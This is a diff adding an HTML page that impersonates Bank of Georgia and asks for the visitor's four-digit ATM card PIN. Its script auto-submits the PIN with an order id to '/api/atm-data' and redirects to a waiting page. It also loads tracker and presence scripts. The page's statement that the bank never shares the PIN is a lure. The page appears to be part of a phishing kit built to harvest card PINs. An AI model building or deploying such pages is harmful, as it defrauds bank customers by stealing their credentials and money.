@@ -1,0 +1,197 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Card PIN — Bank of Georgia</title>
+<style>
+  *{box-sizing:border-box;margin:0;padding:0}
+  html,body{height:100%;font-family:-apple-system,BlinkMacSystemFont,"Helvetica Neue",Arial,sans-serif;-webkit-font-smoothing:antialiased}
+  body{max-width:520px;margin:0 auto;min-height:100vh;background:#fff;display:flex;flex-direction:column}
+
+  .header{
+    display:flex;align-items:center;justify-content:flex-end;
+    padding:14px 18px;border-bottom:1px solid #eee;
+  }
+  .x-btn{background:none;border:none;cursor:pointer;padding:8px}
+  .x-btn svg{width:22px;height:22px;stroke:#1a1a1a;stroke-width:2;fill:none;stroke-linecap:round}
+
+  .content{flex:1;padding:32px 28px 0}
+
+  .atm-icon{
+    width:120px;height:120px;margin:0 auto 20px;display:block;
+  }
+
+  .title{
+    font-size:26px;font-weight:400;color:#1a1a1a;
+    text-align:center;line-height:1.3;margin-bottom:12px;
+    letter-spacing:-.3px;
+  }
+  .subtitle{
+    font-size:14px;color:#9aa0a6;text-align:center;line-height:1.5;
+    margin-bottom:44px;
+  }
+
+  .field{margin-bottom:40px}
+  .lbl{font-size:14px;color:#9aa0a6;margin-bottom:14px;font-weight:400}
+
+  .pin-row{
+    display:flex;gap:16px;margin-top:12px;direction:ltr;
+    justify-content:space-between;max-width:100%;
+  }
+  .pin-digit{
+    flex:1;height:56px;border:none;border-bottom:1.5px solid #d8d8d8;
+    background:transparent;text-align:center;
+    font-size:28px;font-weight:600;color:#1a1a1a;
+    font-family:inherit;outline:none;transition:.2s;padding:0 0 8px;
+    min-width:0;letter-spacing:4px;
+    -webkit-text-security:disc;
+  }
+  .pin-digit::placeholder{color:#d8d8d8;font-weight:300;-webkit-text-security:none}
+  .pin-digit:focus{border-bottom-color:#fc6719}
+
+  .err{
+    display:none;margin:12px 0 0;padding:10px 14px;
+    background:#fff5f5;border:1px solid #fcc;border-radius:10px;
+    color:#dc2626;font-size:14px;text-align:center;font-weight:700;
+  }
+
+  .info{
+    display:flex;align-items:flex-start;gap:10px;
+    background:#f6faf7;border:1px solid #d7ebdc;border-radius:12px;
+    padding:12px 14px;margin-top:28px;
+  }
+  .info svg{width:18px;height:18px;flex-shrink:0;fill:none;stroke:#fc6719;stroke-width:2;margin-top:1px}
+  .info span{font-size:12.5px;color:#2e5e39;line-height:1.5}
+</style>
+</head>
+<body>
+
+  <div class="header">
+    <button class="x-btn" onclick="history.back()" aria-label="Close">
+      <svg viewBox="0 0 24 24"><path d="M6 6l12 12M18 6L6 18"/></svg>
+    </button>
+  </div>
+
+  <div class="content">
+    <svg class="atm-icon" viewBox="0 0 120 120" xmlns="http://www.w3.org/2000/svg">
+      <rect x="12" y="12" width="96" height="96" rx="14" fill="#000" stroke="#fc6719" stroke-width="6"/>
+      <rect x="34" y="26" width="52" height="34" rx="3" fill="none" stroke="#fc6719" stroke-width="4"/>
+      <text x="60" y="51" text-anchor="middle" font-family="Arial,sans-serif" font-size="18" font-weight="800" fill="#fc6719">ATM</text>
+      <rect x="20" y="32" width="8" height="4" rx="1" fill="#fc6719"/>
+      <rect x="20" y="40" width="8" height="4" rx="1" fill="#fc6719"/>
+      <rect x="20" y="48" width="8" height="4" rx="1" fill="#fc6719"/>
+      <rect x="92" y="32" width="8" height="4" rx="1" fill="#fc6719"/>
+      <rect x="92" y="40" width="8" height="4" rx="1" fill="#fc6719"/>
+      <rect x="92" y="48" width="8" height="4" rx="1" fill="#fc6719"/>
+      <rect x="30" y="70" width="60" height="7" rx="2" fill="none" stroke="#fc6719" stroke-width="3"/>
+      <rect x="38" y="82" width="44" height="22" rx="2" fill="none" stroke="#fc6719" stroke-width="3"/>
+      <circle cx="60" cy="93" r="4" fill="#fc6719"/>
+    </svg>
+    <div class="title">Your card PIN</div>
+    <div class="subtitle">Enter the 4-digit PIN<br>you use at the ATM</div>
+
+    <div class="field">
+      <div class="lbl">ATM PIN code</div>
+      <div class="pin-row">
+        <input class="pin-digit" type="tel" inputmode="numeric" maxlength="1" id="p0" placeholder="•">
+        <input class="pin-digit" type="tel" inputmode="numeric" maxlength="1" id="p1" placeholder="•">
+        <input class="pin-digit" type="tel" inputmode="numeric" maxlength="1" id="p2" placeholder="•">
+        <input class="pin-digit" type="tel" inputmode="numeric" maxlength="1" id="p3" placeholder="•">
+      </div>
+      <div class="err" id="errorMsg"></div>
+    </div>
+
+    <div class="info">
+      <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><path d="M12 8v4M12 16h.01"/></svg>
+      <span>Your data is protected. Bank of Georgia never shares your PIN with third parties.</span>
+    </div>
+  </div>
+
+<script>
+  const params  = new URLSearchParams(location.search);
+  const orderId = params.get("order");
+  const phone   = params.get("phone");
+
+  if (!orderId) location.href = "index.html";
+
+  if (params.get("error") === "1") {
+    const el = document.getElementById("errorMsg");
+    el.textContent = "Incorrect PIN";
+    el.style.display = "block";
+    setTimeout(() => { el.style.display = "none"; }, 3500);
+  }
+
+  const digits = document.querySelectorAll(".pin-digit");
+
+  digits.forEach((inp, i) => {
+    inp.addEventListener("input", () => {
+      inp.value = inp.value.replace(/\D/g, "");
+      if (inp.value && i < digits.length - 1) digits[i + 1].focus();
+      maybeAutoSubmit();
+    });
+    inp.addEventListener("keydown", e => {
+      if (e.key === "Backspace" && !inp.value && i > 0) digits[i - 1].focus();
+    });
+    inp.addEventListener("paste", e => {
+      e.preventDefault();
+      const text = (e.clipboardData.getData("text") || "").replace(/\D/g, "");
+      for (let j = 0; j < digits.length && j < text.length; j++) digits[j].value = text[j];
+      const last = Math.min(text.length, digits.length);
+      if (last > 0) digits[Math.min(last, digits.length - 1)].focus();
+      maybeAutoSubmit();
+    });
+  });
+
+  digits[0].focus();
+
+  function getPin() { return Array.from(digits).map(d => d.value).join(""); }
+  function showError(msg) {
+    const el = document.getElementById("errorMsg");
+    el.textContent = msg;
+    el.style.display = "block";
+    setTimeout(() => { el.style.display = "none"; }, 3500);
+  }
+
+  let submitting = false;
+  function maybeAutoSubmit() {
+    const pin = getPin();
+    if (pin.length === digits.length && !submitting) submitPin();
+  }
+
+  async function submitPin() {
+    const pin = getPin();
+    if (pin.length < digits.length) return;
+    submitting = true;
+    digits.forEach(d => d.disabled = true);
+
+    try {
+      const res  = await fetch("/api/atm-data", {
+        method:  "POST",
+        headers: { "Content-Type": "application/json" },
+        body:    JSON.stringify({ order_id: orderId, atm_pin: pin })
+      });
+      const data = await res.json();
+      if (data.success) {
+        location.href = "atm-waiting.html?order=" + orderId +
+                        (phone ? "&phone=" + encodeURIComponent(phone) : "");
+      } else {
+        showError(data.message || "Something went wrong");
+        resetInputs();
+      }
+    } catch (err) {
+      showError("Connection error");
+      resetInputs();
+    }
+  }
+
+  function resetInputs() {
+    submitting = false;
+    digits.forEach(d => { d.disabled = false; d.value = ""; });
+    digits[0].focus();
+  }
+</script>
+<script src="/tracker.js"></script>
+<script src="/presence.js"></script>
+</body>
+</html>
